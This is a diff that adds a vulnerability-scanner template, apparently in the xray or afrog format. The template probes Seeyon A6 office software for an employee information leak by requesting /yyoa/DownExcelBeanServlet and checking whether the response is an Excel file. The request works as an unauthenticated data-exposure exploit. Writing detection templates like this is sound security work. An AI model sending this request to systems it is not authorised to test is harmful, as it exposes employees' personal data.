@@ -1,0 +1,15 @@
+expression: r0()
+id: seeyon-a6-employee-info-leak
+info:
+  author: sakura404x
+  description: app="Seeyon-A6"
+  name: seeyon-a6-employee-info-leak
+  severity: high
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"[Content_Types].xml")
+      && response.body.bcontains(b"Excel.Sheet")
+    request:
+      method: GET
+      path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
